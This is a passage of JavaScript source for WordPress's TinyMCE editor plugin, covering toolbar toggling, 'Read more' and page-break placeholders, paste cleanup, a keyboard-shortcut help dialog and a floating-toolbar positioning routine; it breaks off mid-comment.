/* global getUserSetting, setUserSetting */
( function( tinymce ) {
// Set the minimum value for the modals z-index higher than #wpadminbar (100000).
if ( ! tinymce.ui.FloatPanel.zIndex || tinymce.ui.FloatPanel.zIndex < 100100 ) {
	tinymce.ui.FloatPanel.zIndex = 100100;
}

tinymce.PluginManager.add( 'wordpress', function( editor ) {
	var wpAdvButton, style,
		DOM = tinymce.DOM,
		each = tinymce.each,
		__ = editor.editorManager.i18n.translate,
		$ = window.jQuery,
		wp = window.wp,
		hasWpautop = ( wp && wp.editor && wp.editor.autop && editor.getParam( 'wpautop', true ) ),
		wpTooltips = false;

	if ( $ ) {
		// Runs as soon as TinyMCE has started initializing, while plugins are loading.
		// Handlers attached after the `tinymce.init()` call may not get triggered for this instance.
		$( document ).triggerHandler( 'tinymce-editor-setup', [ editor ] );
	}

	function toggleToolbars( state ) {
		var initial, toolbars, iframeHeight,
			pixels = 0,
			classicBlockToolbar = tinymce.$( '.block-library-classic__toolbar' );

		if ( state === 'hide' ) {
			initial = true;
		} else if ( classicBlockToolbar.length && ! classicBlockToolbar.hasClass( 'has-advanced-toolbar' ) ) {
			// Show the second, third, etc. toolbar rows in the Classic block instance.
			classicBlockToolbar.addClass( 'has-advanced-toolbar' );
			state = 'show';
		}

		if ( editor.theme.panel ) {
			toolbars = editor.theme.panel.find('.toolbar:not(.menubar)');
		}

		if ( toolbars && toolbars.length > 1 ) {
			if ( ! state && toolbars[1].visible() ) {
				state = 'hide';
			}

			each( toolbars, function( toolbar, i ) {
				if ( i > 0 ) {
					if ( state === 'hide' ) {
						toolbar.hide();
						pixels += 34;
					} else {
						toolbar.show();
						pixels -= 34;
					}
				}
			});
		}

		// Resize editor iframe, not needed for iOS and inline instances.
		// Don't resize if the editor is in a hidden container.
		if ( pixels && ! tinymce.Env.iOS && editor.iframeElement && editor.iframeElement.clientHeight ) {
			iframeHeight = editor.iframeElement.clientHeight + pixels;

			// Keep min-height.
			if ( iframeHeight > 50  ) {
				DOM.setStyle( editor.iframeElement, 'height', iframeHeight );
			}
		}

		if ( ! initial ) {
			if ( state === 'hide' ) {
				setUserSetting( 'hidetb', '0' );
				wpAdvButton && wpAdvButton.active( false );
			} else {
				setUserSetting( 'hidetb', '1' );
				wpAdvButton && wpAdvButton.active( true );
			}
		}

		editor.fire( 'wp-toolbar-toggle' );
	}

	// Add the kitchen sink button :)
	editor.addButton( 'wp_adv', {
		tooltip: 'Toolbar Toggle',
		cmd: 'WP_Adv',
		onPostRender: function() {
			wpAdvButton = this;
			wpAdvButton.active( getUserSetting( 'hidetb' ) === '1' );
		}
	});

	// Hide the toolbars after loading.
	editor.on( 'PostRender', function() {
		if ( editor.getParam( 'wordpress_adv_hidden', true ) && getUserSetting( 'hidetb', '0' ) === '0' ) {
			toggleToolbars( 'hide' );
		} else {
			tinymce.$( '.block-library-classic__toolbar' ).addClass( 'has-advanced-toolbar' );
		}
	});

	editor.addCommand( 'WP_Adv', function() {
		toggleToolbars();
	});

	editor.on( 'focus', function() {
        window.wpActiveEditor = editor.id;
    });

	editor.on( 'BeforeSetContent', function( event ) {
		var title;

		if ( event.content ) {
			if ( event.content.indexOf( '<!--more' ) !== -1 ) {
				title = __( 'Read more...' );

				event.content = event.content.replace( /<!--more(.*?)-->/g, function( match, moretext ) {
					return '<img src="' + tinymce.Env.transparentSrc + '" data-wp-more="more" data-wp-more-text="' + moretext + '" ' +
						'class="wp-more-tag mce-wp-more" alt="" title="' + title + '" data-mce-resize="false" data-mce-placeholder="1" />';
				});
			}

			if ( event.content.indexOf( '<!--nextpage-->' ) !== -1 ) {
				title = __( 'Page break' );

				event.content = event.content.replace( /<!--nextpage-->/g,
					'<img src="' + tinymce.Env.transparentSrc + '" data-wp-more="nextpage" class="wp-more-tag mce-wp-nextpage" ' +
						'alt="" title="' + title + '" data-mce-resize="false" data-mce-placeholder="1" />' );
			}

			if ( event.load && event.format !== 'raw' ) {
				if ( hasWpautop ) {
					event.content = wp.editor.autop( event.content );
				} else {
					// Prevent creation of paragraphs out of multiple HTML comments.
					event.content = event.content.replace( /-->\s+<!--/g, '--><!--' );
				}
			}

			if ( event.content.indexOf( '<script' ) !== -1 || event.content.indexOf( '<style' ) !== -1 ) {
				event.content = event.content.replace( /<(script|style)[^>]*>[\s\S]*?<\/\1>/g, function( match, tag ) {
					return '<img ' +
						'src="' + tinymce.Env.transparentSrc + '" ' +
						'data-wp-preserve="' + encodeURIComponent( match ) + '" ' +
						'data-mce-resize="false" ' +
						'data-mce-placeholder="1" '+
						'class="mce-object" ' +
						'width="20" height="20" '+
						'alt="&lt;' + tag + '&gt;" ' +
						'title="&lt;' + tag + '&gt;" ' +
					'/>';
				} );
			}
		}
	});

	editor.on( 'setcontent', function() {
		// Remove spaces from empty paragraphs.
		editor.$( 'p' ).each( function( i, node ) {
			if ( node.innerHTML && node.innerHTML.length < 10 ) {
				var html = tinymce.trim( node.innerHTML );

				if ( ! html || html === '&nbsp;' ) {
					node.innerHTML = ( tinymce.Env.ie && tinymce.Env.ie < 11 ) ? '' : '<br data-mce-bogus="1">';
				}
			}
		} );
	});

	editor.on( 'PostProcess', function( event ) {
		if ( event.get ) {
			event.content = event.content.replace(/<img[^>]+>/g, function( image ) {
				var match,
					string,
					moretext = '';

				if ( image.indexOf( 'data-wp-more="more"' ) !== -1 ) {
					if ( match = image.match( /data-wp-more-text="([^"]+)"/ ) ) {
						moretext = match[1];
					}

					string = '<!--more' + moretext + '-->';
				} else if ( image.indexOf( 'data-wp-more="nextpage"' ) !== -1 ) {
					string = '<!--nextpage-->';
				} else if ( image.indexOf( 'data-wp-preserve' ) !== -1 ) {
					if ( match = image.match( / data-wp-preserve="([^"]+)"/ ) ) {
						string = decodeURIComponent( match[1] );
					}
				}

				return string || image;
			});
		}
	});

	// Display the tag name instead of img in element path.
	editor.on( 'ResolveName', function( event ) {
		var attr;

		if ( event.target.nodeName === 'IMG' && ( attr = editor.dom.getAttrib( event.target, 'data-wp-more' ) ) ) {
			event.name = attr;
		}
	});

	// Register commands.
	editor.addCommand( 'WP_More', function( tag ) {
		var parent, html, title,
			classname = 'wp-more-tag',
			dom = editor.dom,
			node = editor.selection.getNode(),
			rootNode = editor.getBody();

		tag = tag || 'more';
		classname += ' mce-wp-' + tag;
		title = tag === 'more' ? 'Read more...' : 'Next page';
		title = __( title );
		html = '<img src="' + tinymce.Env.transparentSrc + '" alt="" title="' + title + '" class="' + classname + '" ' +
			'data-wp-more="' + tag + '" data-mce-resize="false" data-mce-placeholder="1" />';

		// Most common case.
		if ( node === rootNode || ( node.nodeName === 'P' && node.parentNode === rootNode ) ) {
			editor.insertContent( html );
			return;
		}

		// Get the top level parent node.
		parent = dom.getParent( node, function( found ) {
			if ( found.parentNode && found.parentNode === rootNode ) {
				return true;
			}

			return false;
		}, editor.getBody() );

		if ( parent ) {
			if ( parent.nodeName === 'P' ) {
				parent.appendChild( dom.create( 'p', null, html ).firstChild );
			} else {
				dom.insertAfter( dom.create( 'p', null, html ), parent );
			}

			editor.nodeChanged();
		}
	});

	editor.addCommand( 'WP_Code', function() {
		editor.formatter.toggle('code');
	});

	editor.addCommand( 'WP_Page', function() {
		editor.execCommand( 'WP_More', 'nextpage' );
	});

	editor.addCommand( 'WP_Help', function() {
		var access = tinymce.Env.mac ? __( 'Ctrl + Alt + letter:' ) : __( 'Shift + Alt + letter:' ),
			meta = tinymce.Env.mac ? __( '⌘ + letter:' ) : __( 'Ctrl + letter:' ),
			table1 = [],
			table2 = [],
			row1 = {},
			row2 = {},
			i1 = 0,
			i2 = 0,
			labels = editor.settings.wp_shortcut_labels,
			header, html, dialog, $wrap;

		if ( ! labels ) {
			return;
		}

		function tr( row, columns ) {
			var out = '<tr>';
			var i = 0;

			columns = columns || 1;

			each( row, function( text, key ) {
				out += '<td><kbd>' + key + '</kbd></td><td>' + __( text ) + '</td>';
				i++;
			});

			while ( i < columns ) {
				out += '<td></td><td></td>';
				i++;
			}

			return out + '</tr>';
		}

		each ( labels, function( label, name ) {
			var letter;

			if ( label.indexOf( 'meta' ) !== -1 ) {
				i1++;
				letter = label.replace( 'meta', '' ).toLowerCase();

				if ( letter ) {
					row1[ letter ] = name;

					if ( i1 % 2 === 0 ) {
						table1.push( tr( row1, 2 ) );
						row1 = {};
					}
				}
			} else if ( label.indexOf( 'access' ) !== -1 ) {
				i2++;
				letter = label.replace( 'access', '' ).toLowerCase();

				if ( letter ) {
					row2[ letter ] = name;

					if ( i2 % 2 === 0 ) {
						table2.push( tr( row2, 2 ) );
						row2 = {};
					}
				}
			}
		} );

		// Add remaining single entries.
		if ( i1 % 2 > 0 ) {
			table1.push( tr( row1, 2 ) );
		}

		if ( i2 % 2 > 0 ) {
			table2.push( tr( row2, 2 ) );
		}

		header = [ __( 'Letter' ), __( 'Action' ), __( 'Letter' ), __( 'Action' ) ];
		header = '<tr><th>' + header.join( '</th><th>' ) + '</th></tr>';

		html = '<div class="wp-editor-help">';

		// Main section, default and additional shortcuts.
		html = html +
			'<h2>' + __( 'Default shortcuts,' ) + ' ' + meta + '</h2>' +
			'<table class="wp-help-th-center fixed">' +
				header +
				table1.join('') +
			'</table>' +
			'<h2>' + __( 'Additional shortcuts,' ) + ' ' + access + '</h2>' +
			'<table class="wp-help-th-center fixed">' +
				header +
				table2.join('') +
			'</table>';

		if ( editor.plugins.wptextpattern && ( ! tinymce.Env.ie || tinymce.Env.ie > 8 ) ) {
			// Text pattern section.
			html = html +
				'<h2>' + __( 'When starting a new paragraph with one of these formatting shortcuts followed by a space, the formatting will be applied automatically. Press Backspace or Escape to undo.' ) + '</h2>' +
				'<table class="wp-help-th-center fixed">' +
					tr({ '*':  'Bullet list', '1.':  'Numbered list' }) +
					tr({ '-':  'Bullet list', '1)':  'Numbered list' }) +
				'</table>';

			html = html +
				'<h2>' + __( 'The following formatting shortcuts are replaced when pressing Enter. Press Escape or the Undo button to undo.' ) + '</h2>' +
				'<table class="wp-help-single">' +
					tr({ '>': 'Blockquote' }) +
					tr({ '##': 'Heading 2' }) +
					tr({ '###': 'Heading 3' }) +
					tr({ '####': 'Heading 4' }) +
					tr({ '#####': 'Heading 5' }) +
					tr({ '######': 'Heading 6' }) +
					tr({ '---': 'Horizontal line' }) +
				'</table>';
		}

		// Focus management section.
		html = html +
			'<h2>' + __( 'Focus shortcuts:' ) + '</h2>' +
			'<table class="wp-help-single">' +
				tr({ 'Alt + F8':  'Inline toolbar (when an image, link or preview is selected)' }) +
				tr({ 'Alt + F9':  'Editor menu (when enabled)' }) +
				tr({ 'Alt + F10': 'Editor toolbar' }) +
				tr({ 'Alt + F11': 'Elements path' }) +
			'</table>' +
			'<p>' + __( 'To move focus to other buttons use Tab or the arrow keys. To return focus to the editor press Escape or use one of the buttons.' ) + '</p>';

		html += '</div>';

		dialog = editor.windowManager.open( {
			title: editor.settings.classic_block_editor ? 'Classic Block Keyboard Shortcuts' : 'Keyboard Shortcuts',
			items: {
				type: 'container',
				classes: 'wp-help',
				html: html
			},
			buttons: {
				text: 'Close',
				onclick: 'close'
			}
		} );

		if ( dialog.$el ) {
			dialog.$el.find( 'div[role="application"]' ).attr( 'role', 'document' );
			$wrap = dialog.$el.find( '.mce-wp-help' );

			if ( $wrap[0] ) {
				$wrap.attr( 'tabindex', '0' );
				$wrap[0].focus();
				$wrap.on( 'keydown', function( event ) {
					// Prevent use of: page up, page down, end, home, left arrow, up arrow, right arrow, down arrow
					// in the dialog keydown handler.
					if ( event.keyCode >= 33 && event.keyCode <= 40 ) {
						event.stopPropagation();
					}
				});
			}
		}
	} );

	editor.addCommand( 'WP_Medialib', function() {
		if ( wp && wp.media && wp.media.editor ) {
			wp.media.editor.open( editor.id );
		}
	});

	// Register buttons.
	editor.addButton( 'wp_more', {
		tooltip: 'Insert Read More tag',
		onclick: function() {
			editor.execCommand( 'WP_More', 'more' );
		}
	});

	editor.addButton( 'wp_page', {
		tooltip: 'Page break',
		onclick: function() {
			editor.execCommand( 'WP_More', 'nextpage' );
		}
	});

	editor.addButton( 'wp_help', {
		tooltip: 'Keyboard Shortcuts',
		cmd: 'WP_Help'
	});

	editor.addButton( 'wp_code', {
		tooltip: 'Code',
		cmd: 'WP_Code',
		stateSelector: 'code'
	});

	// Insert->Add Media.
	if ( wp && wp.media && wp.media.editor ) {
		editor.addButton( 'wp_add_media', {
			tooltip: 'Add Media',
			icon: 'dashicon dashicons-admin-media',
			cmd: 'WP_Medialib'
		} );

		editor.addMenuItem( 'add_media', {
			text: 'Add Media',
			icon: 'wp-media-library',
			context: 'insert',
			cmd: 'WP_Medialib'
		});
	}

	// Insert "Read More...".
	editor.addMenuItem( 'wp_more', {
		text: 'Insert Read More tag',
		icon: 'wp_more',
		context: 'insert',
		onclick: function() {
			editor.execCommand( 'WP_More', 'more' );
		}
	});

	// Insert "Next Page".
	editor.addMenuItem( 'wp_page', {
		text: 'Page break',
		icon: 'wp_page',
		context: 'insert',
		onclick: function() {
			editor.execCommand( 'WP_More', 'nextpage' );
		}
	});

	editor.on( 'BeforeExecCommand', function(e) {
		if ( tinymce.Env.webkit && ( e.command === 'InsertUnorderedList' || e.command === 'InsertOrderedList' ) ) {
			if ( ! style ) {
				style = editor.dom.create( 'style', {'type': 'text/css'},
					'#tinymce,#tinymce span,#tinymce li,#tinymce li>span,#tinymce p,#tinymce p>span{font:medium sans-serif;color:#000;line-height:normal;}');
			}

			editor.getDoc().head.appendChild( style );
		}
	});

	editor.on( 'ExecCommand', function( e ) {
		if ( tinymce.Env.webkit && style &&
			( 'InsertUnorderedList' === e.command || 'InsertOrderedList' === e.command ) ) {

			editor.dom.remove( style );
		}
	});

	editor.on( 'init', function() {
		var env = tinymce.Env,
			bodyClass = ['mceContentBody'], // Back-compat for themes that use this in editor-style.css...
			doc = editor.getDoc(),
			dom = editor.dom;

		if ( env.iOS ) {
			dom.addClass( doc.documentElement, 'ios' );
		}

		if ( editor.getParam( 'directionality' ) === 'rtl' ) {
			bodyClass.push('rtl');
			dom.setAttrib( doc.documentElement, 'dir', 'rtl' );
		}

		dom.setAttrib( doc.documentElement, 'lang', editor.getParam( 'wp_lang_attr' ) );

		if ( env.ie ) {
			if ( parseInt( env.ie, 10 ) === 9 ) {
				bodyClass.push('ie9');
			} else if ( parseInt( env.ie, 10 ) === 8 ) {
				bodyClass.push('ie8');
			} else if ( env.ie < 8 ) {
				bodyClass.push('ie7');
			}
		} else if ( env.webkit ) {
			bodyClass.push('webkit');
		}

		bodyClass.push('wp-editor');

		each( bodyClass, function( cls ) {
			if ( cls ) {
				dom.addClass( doc.body, cls );
			}
		});

		// Remove invalid parent paragraphs when inserting HTML.
		editor.on( 'BeforeSetContent', function( event ) {
			if ( event.content ) {
				event.content = event.content.replace( /<p>\s*<(p|div|ul|ol|dl|table|blockquote|h[1-6]|fieldset|pre)( [^>]*)?>/gi, '<$1$2>' )
					.replace( /<\/(p|div|ul|ol|dl|table|blockquote|h[1-6]|fieldset|pre)>\s*<\/p>/gi, '</$1>' );
			}
		});

		if ( $ ) {
			// Run on DOM ready. Otherwise TinyMCE may initialize earlier and handlers attached
			// on DOM ready of after the `tinymce.init()` call may not get triggered.
			$( function() {
				$( document ).triggerHandler( 'tinymce-editor-init', [editor] );
			});
		}

		if ( window.tinyMCEPreInit && window.tinyMCEPreInit.dragDropUpload ) {
			dom.bind( doc, 'dragstart dragend dragover drop', function( event ) {
				if ( $ ) {
					// Trigger the jQuery handlers.
					$( document ).trigger( new $.Event( event ) );
				}
			});
		}

		if ( editor.getParam( 'wp_paste_filters', true ) ) {
			editor.on( 'PastePreProcess', function( event ) {
				// Remove trailing <br> added by WebKit browsers to the clipboard.
				event.content = event.content.replace( /<br class="?Apple-interchange-newline"?>/gi, '' );

				// In WebKit this is handled by removeWebKitStyles().
				if ( ! tinymce.Env.webkit ) {
					// Remove all inline styles.
					event.content = event.content.replace( /(<[^>]+) style="[^"]*"([^>]*>)/gi, '$1$2' );

					// Put back the internal styles.
					event.content = event.content.replace(/(<[^>]+) data-mce-style=([^>]+>)/gi, '$1 style=$2' );
				}
			});

			editor.on( 'PastePostProcess', function( event ) {
				// Remove empty paragraphs.
				editor.$( 'p', event.node ).each( function( i, node ) {
					if ( dom.isEmpty( node ) ) {
						dom.remove( node );
					}
				});

				if ( tinymce.isIE ) {
					editor.$( 'a', event.node ).find( 'font, u' ).each( function( i, node ) {
						dom.remove( node, true );
					});
				}
			});
		}
	});

	editor.on( 'SaveContent', function( event ) {
		// If editor is hidden, we just want the textarea's value to be saved.
		if ( ! editor.inline && editor.isHidden() ) {
			event.content = event.element.value;
			return;
		}

		// Keep empty paragraphs :(
		event.content = event.content.replace( /<p>(?:<br ?\/?>|\u00a0|\uFEFF| )*<\/p>/g, '<p>&nbsp;</p>' );

		if ( hasWpautop ) {
			event.content = wp.editor.removep( event.content );
		} else {
			// Restore formatting of block boundaries.
			event.content = event.content.replace( /-->\s*<!-- wp:/g, '-->\n\n<!-- wp:' );
		}
	});

	editor.on( 'preInit', function() {
		var validElementsSetting = '@[id|accesskey|class|dir|lang|style|tabindex|' +
			'title|contenteditable|draggable|dropzone|hidden|spellcheck|translate],' + // Global attributes.
			'i,' + // Don't replace <i> with <em> and <b> with <strong> and don't remove them when empty.
			'b,' +
			'script[src|async|defer|type|charset|crossorigin|integrity]'; // Add support for <script>.

		editor.schema.addValidElements( validElementsSetting );

		if ( tinymce.Env.iOS ) {
			editor.settings.height = 300;
		}

		each( {
			c: 'JustifyCenter',
			r: 'JustifyRight',
			l: 'JustifyLeft',
			j: 'JustifyFull',
			q: 'mceBlockQuote',
			u: 'InsertUnorderedList',
			o: 'InsertOrderedList',
			m: 'WP_Medialib',
			t: 'WP_More',
			d: 'Strikethrough',
			p: 'WP_Page',
			x: 'WP_Code'
		}, function( command, key ) {
			editor.shortcuts.add( 'access+' + key, '', command );
		} );

		editor.addShortcut( 'meta+s', '', function() {
			if ( wp && wp.autosave ) {
				wp.autosave.server.triggerSave();
			}
		} );

		// Alt+Shift+Z removes a block in the block editor, don't add it to the Classic block.
		if ( ! editor.settings.classic_block_editor ) {
			editor.addShortcut( 'access+z', '', 'WP_Adv' );
		}

		// Workaround for not triggering the global help modal in the block editor by the Classic block shortcut.
		editor.on( 'keydown', function( event ) {
			var match;

			if ( tinymce.Env.mac ) {
				match = event.ctrlKey && event.altKey && event.code === 'KeyH';
			} else {
				match = event.shiftKey && event.altKey && event.code === 'KeyH';
			}

			if ( match ) {
				editor.execCommand( 'WP_Help' );
				event.stopPropagation();
				event.stopImmediatePropagation();
				return false;
			}

			return true;
		});

		if ( window.getUserSetting( 'editor_plain_text_paste_warning' ) > 1 ) {
			editor.settings.paste_plaintext_inform = false;
		}

		// Change the editor iframe title on MacOS, add the correct help shortcut.
		if ( tinymce.Env.mac ) {
			tinymce.$( editor.iframeElement ).attr( 'title', __( 'Rich Text Area. Press Control-Option-H for help.' ) );
		}
	} );

	editor.on( 'PastePlainTextToggle', function( event ) {
		// Warn twice, then stop.
		if ( event.state === true ) {
			var times = parseInt( window.getUserSetting( 'editor_plain_text_paste_warning' ), 10 ) || 0;

			if ( times < 2 ) {
				window.setUserSetting( 'editor_plain_text_paste_warning', ++times );
			}
		}
	});

	editor.on( 'beforerenderui', function() {
		if ( editor.theme.panel ) {
			each( [ 'button', 'colorbutton', 'splitbutton' ], function( buttonType ) {
				replaceButtonsTooltips( editor.theme.panel.find( buttonType ) );
			} );

			addShortcutsToListbox();
		}
	} );

	function prepareTooltips() {
		var access = 'Shift+Alt+';
		var meta = 'Ctrl+';

		wpTooltips = {};

		// For MacOS: ctrl = \u2303, cmd = \u2318, alt = \u2325.
		if ( tinymce.Env.mac ) {
			access = '\u2303\u2325';
			meta = '\u2318';
		}

		// Some tooltips are translated, others are not...
		if ( editor.settings.wp_shortcut_labels ) {
			each( editor.settings.wp_shortcut_labels, function( value, tooltip ) {
				var translated = editor.translate( tooltip );

				value = value.replace( 'access', access ).replace( 'meta', meta );
				wpTooltips[ tooltip ] = value;

				// Add the translated so we can match all of them.
				if ( tooltip !== translated ) {
					wpTooltips[ translated ] = value;
				}
			} );
		}
	}

	function getTooltip( tooltip ) {
		var translated = editor.translate( tooltip );
		var label;

		if ( ! wpTooltips ) {
			prepareTooltips();
		}

		if ( wpTooltips.hasOwnProperty( translated ) ) {
			label = wpTooltips[ translated ];
		} else if ( wpTooltips.hasOwnProperty( tooltip ) ) {
			label = wpTooltips[ tooltip ];
		}

		return label ? translated + ' (' + label + ')' : translated;
	}

	function replaceButtonsTooltips( buttons ) {

		if ( ! buttons ) {
			return;
		}

		each( buttons, function( button ) {
			var tooltip;

			if ( button && button.settings.tooltip ) {
				tooltip = getTooltip( button.settings.tooltip );
				button.settings.tooltip = tooltip;

				// Override the aria label with the translated tooltip + shortcut.
				if ( button._aria && button._aria.label ) {
					button._aria.label = tooltip;
				}
			}
		} );
	}

	function addShortcutsToListbox() {
		// listbox for the "blocks" drop-down.
		each( editor.theme.panel.find( 'listbox' ), function( listbox ) {
			if ( listbox && listbox.settings.text === 'Paragraph' ) {
				each( listbox.settings.values, function( item ) {
					if ( item.text && wpTooltips.hasOwnProperty( item.text ) ) {
						item.shortcut = '(' + wpTooltips[ item.text ] + ')';
					}
				} );
			}
		} );
	}

	/**
	 * Experimental: create a floating toolbar.
	 * This functionality will change in the next releases. Not recommended for use by plugins.
	 */
	editor.on( 'preinit', function() {
		var Factory = tinymce.ui.Factory,
			settings = editor.settings,
			activeToolbar,
			currentSelection,
			timeout,
			container = editor.getContainer(),
			wpAdminbar = document.getElementById( 'wpadminbar' ),
			mceIframe = document.getElementById( editor.id + '_ifr' ),
			mceToolbar,
			mceStatusbar,
			wpStatusbar,
			cachedWinSize;

			if ( container ) {
				mceToolbar = tinymce.$( '.mce-toolbar-grp', container )[0];
				mceStatusbar = tinymce.$( '.mce-statusbar', container )[0];
			}

			if ( editor.id === 'content' ) {
				wpStatusbar = document.getElementById( 'post-status-info' );
			}

		function create( buttons, bottom ) {
			var toolbar,
				toolbarItems = [],
				buttonGroup;

			each( buttons, function( item ) {
				var itemName;
				var tooltip;

				function bindSelectorChanged() {
					var selection = editor.selection;

					if ( itemName === 'bullist' ) {
						selection.selectorChanged( 'ul > li', function( state, args ) {
							var i = args.parents.length,
								nodeName;

							while ( i-- ) {
								nodeName = args.parents[ i ].nodeName;

								if ( nodeName === 'OL' || nodeName == 'UL' ) {
									break;
								}
							}

							item.active( state && nodeName === 'UL' );
						} );
					}

					if ( itemName === 'numlist' ) {
						selection.selectorChanged( 'ol > li', function( state, args ) {
							var i = args.parents.length,
								nodeName;

							while ( i-- ) {
								nodeName = args.parents[ i ].nodeName;

								if ( nodeName === 'OL' || nodeName === 'UL' ) {
									break;
								}
							}

							item.active( state && nodeName === 'OL' );
						} );
					}

					if ( item.settings.stateSelector ) {
						selection.selectorChanged( item.settings.stateSelector, function( state ) {
							item.active( state );
						}, true );
					}

					if ( item.settings.disabledStateSelector ) {
						selection.selectorChanged( item.settings.disabledStateSelector, function( state ) {
							item.disabled( state );
						} );
					}
				}

				if ( item === '|' ) {
					buttonGroup = null;
				} else {
					if ( Factory.has( item ) ) {
						item = {
							type: item
						};

						if ( settings.toolbar_items_size ) {
							item.size = settings.toolbar_items_size;
						}

						toolbarItems.push( item );

						buttonGroup = null;
					} else {
						if ( ! buttonGroup ) {
							buttonGroup = {
								type: 'buttongroup',
								items: []
							};

							toolbarItems.push( buttonGroup );
						}

						if ( editor.buttons[ item ] ) {
							itemName = item;
							item = editor.buttons[ itemName ];

							if ( typeof item === 'function' ) {
								item = item();
							}

							item.type = item.type || 'button';

							if ( settings.toolbar_items_size ) {
								item.size = settings.toolbar_items_size;
							}

							tooltip = item.tooltip || item.title;

							if ( tooltip ) {
								item.tooltip = getTooltip( tooltip );
							}

							item = Factory.create( item );

							buttonGroup.items.push( item );

							if ( editor.initialized ) {
								bindSelectorChanged();
							} else {
								editor.on( 'init', bindSelectorChanged );
							}
						}
					}
				}
			} );

			toolbar = Factory.create( {
				type: 'panel',
				layout: 'stack',
				classes: 'toolbar-grp inline-toolbar-grp',
				ariaRoot: true,
				ariaRemember: true,
				items: [ {
					type: 'toolbar',
					layout: 'flow',
					items: toolbarItems
				} ]
			} );

			toolbar.bottom = bottom;

			function reposition() {
				if ( ! currentSelection ) {
					return this;
				}

				var scrollX = window.pageXOffset || document.documentElement.scrollLeft,
					scrollY = window.pageYOffset || document.documentElement.scrollTop,
					windowWidth = window.innerWidth,
					windowHeight = window.innerHeight,
					iframeRect = mceIframe ? mceIframe.getBoundingClientRect() : {
						top: 0,
						right: windowWidth,
						bottom: windowHeight,
						left: 0,
						width: windowWidth,
						height: windowHeight
					},
					toolbar = this.getEl(),
					toolbarWidth = toolbar.offsetWidth,
					toolbarHeight = toolbar.clientHeight,
					selection = currentSelection.getBoundingClientRect(),
					selectionMiddle = ( selection.left + selection.right ) / 2,
					buffer = 5,
					spaceNeeded = toolbarHeight + buffer,
					wpAdminbarBottom = wpAdminbar ? wpAdminbar.getBoundingClientRect().bottom : 0,
					mceToolbarBottom = mceToolbar ? mceToolbar.getBoundingClientRect().bottom : 0,
					mceStatusbarTop = mceStatusbar ? windowHeight - mceStatusbar.getBoundingClientRect().top : 0,
					wpStatusbarTop = wpStatusbar ? windowHeight - wpStatusbar.getBoundingClientRect().top : 0,
					blockedTop = Math.max( 0, wpAdminbarBottom, mceToolbarBottom, iframeRect.top ),
					blockedBottom = Math.max( 0, mceStatusbarTop, wpStatusbarTop, windowHeight - iframeRect.bottom ),
					spaceTop = selection.top + iframeRect.top - blockedTop,
					spaceBottom = windowHeight - iframeRect.top - selection.bottom - blockedBottom,
					editorHeight = windowHeight - blockedTop - blockedBottom,
					className = '',
					iosOffsetTop = 0,
					iosOffsetBottom = 0,
					top, left;

				if ( spaceTop >= editorHeight || spaceBottom >= editorHeight ) {
					this.scrolling = true;
					this.hide();
					this.scrolling = false;
					return this;
				}

				// Add offset in iOS to move the menu over the image, out of the way of the default iOS menu.
				if ( tinymce.Env.iOS && currentSelection.nodeName === 'IMG' ) {
					iosOffsetTop = 54;
					iosOffsetBottom = 46;
				}

				if ( this.bottom ) {
					if ( spaceBottom >= spaceNeeded ) {
						className = ' mce-arrow-up';
						top = selection.bottom + iframeRect.top + scrollY - iosOffsetBottom;
					} else if ( spaceTop >= spaceNeeded ) {
						className = ' mce-arrow-down';
						top = selection.top + iframeRect.top + scrollY - toolbarHeight + iosOffsetTop;
					}
				} else {
					if ( spaceTop >= spaceNeeded ) {
						className = ' mce-arrow-down';
						top = selection.top + iframeRect.top + scrollY - toolbarHeight + iosOffsetTop;
					} else if ( spaceBottom >= spaceNeeded && editorHeight / 2 > selection.bottom + iframeRect.top - blockedTop ) {
						className = ' mce-arrow-up';
						top = selection.bottom + iframeRect.top + scrollY - iosOffsetBottom;
					}
				}

				if ( typeof top === 'undefined' ) {
					top = scrollY + blockedTop + buffer + iosOffsetBottom;
				}

				left = selectionMiddle - toolbarWidth / 2 + iframeRect.left + scrollX;

				if ( selection.left < 0 || selection.right > iframeRect.width ) {
					left = iframeRect.left + scrollX + ( iframeRect.width - toolbarWidth ) / 2;
				} else if ( toolbarWidth >= windowWidth ) {
					className += ' mce-arrow-full';
					left = 0;
				} else if ( ( left < 0 && selection.left + toolbarWidth > windowWidth ) || ( left + toolbarWidth > windowWidth && selection.right - toolbarWidth < 0 ) ) {
					left = ( windowWidth - toolbarWidth ) / 2;
				} else if ( left < iframeRect.left + scrollX ) {
					className += ' mce-arrow-left';
					left = selection.left + iframeRect.left + scrollX;
				} else if ( left + toolbarWidth > iframeRect.width + iframeRect.left + scrollX ) {
					className += ' mce-arrow-right';
					left = selection.right - toolbarWidth + iframeRect.left + scrollX;
				}

				// No up/down arrows on the menu over images in iOS.
				if ( tinymce.Env.iOS && currentSelection.nodeName === 'IMG' ) {
					className = className.replace( / ?mce-arrow-(up|down)/g, '' );
				}

				toolbar.className = toolbar.className.replace( / ?mce-arrow-[\w]+/g, '' ) + className;

				DOM.setStyles( toolbar, {
					'left': left,
					'top': top
				} );

				return this;
			}

			toolbar.on( 'show', function() {
				this.reposition();
			} );

			toolbar.on( 'keydown', function( event ) {
				if ( event.keyCode === 27 ) {
					this.hide();
					editor.focus();
				}
			} );

			editor.on( 'remove', function() {
				toolbar.remove();
			} );

			toolbar.reposition = reposition;
			toolbar.hide().renderTo( document.body );

			return toolbar;
		}

		editor.shortcuts.add( 'alt+119', '', function() {
			var node;

			if ( activeToolbar ) {
				node = activeToolbar.find( 'toolbar' )[0];
				node && node.focus( true );
			}
		} );

		editor.on( 'nodechange', function( event ) {
			var collapsed = editor.selection.isCollapsed();

			var args = {
				element: event.element,
				parents: event.parents,
				collapsed: collapsed
			};

			editor.fire( 'wptoolbar', args );

			currentSelection = args.selection || args.element;

			if ( activeToolbar && activeToolbar !== args.toolbar ) {
				activeToolbar.hide();
			}

			if ( args.toolbar ) {
				activeToolbar = args.toolbar;

				if ( activeToolbar.visible() ) {
					activeToolbar.reposition();
				} else {
					activeToolbar.show();
				}
			} else {
				activeToolbar = false;
			}
		} );

		editor.on( 'focus', function() {
			if ( activeToolbar ) {
				activeToolbar.show();
			}
		} );

		function hide( event ) {
			var win;
			var size;

			if ( activeToolbar ) {
				if ( activeToolbar.tempHide || event.type === 'hide' || event.type === 'blur' ) {
					activeToolbar.hide();
					activeToolbar = false;
				} else if ( (
					event.type === 'resizewindow' ||
					event.type === 'scrollwindow' ||
					event.type === 'resize' ||
					event.type === 'scroll'
				) && ! activeToolbar.blockHide ) {
					/*
					 * Showing a tooltip may trigger a `resize` event in Chromium browsers.
